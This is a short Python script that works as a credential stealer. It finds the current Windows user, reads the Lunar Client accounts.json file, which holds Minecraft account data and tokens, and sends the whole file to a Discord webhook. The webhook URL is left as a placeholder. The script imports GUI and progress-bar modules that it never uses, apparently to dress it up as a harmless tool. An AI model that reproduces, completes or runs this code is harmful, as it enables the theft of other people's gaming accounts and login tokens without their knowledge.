import os
import getpass
from discord_webhook import DiscordWebhook
import tkinter as tk
from tkinter import messagebox
from tkinter.ttk import Progressbar
username = getpass.getuser()
folder_path = r"C:\Users\{}\.lunarclient\settings\game".format(username)
file_path = os.path.join(folder_path, "accounts.json")

with open(file_path, "r") as file:
    file_contents = file.read()

webhook_url = "webhook"
webhook = DiscordWebhook(url=webhook_url, content=file_contents)
response = webhook.execute()
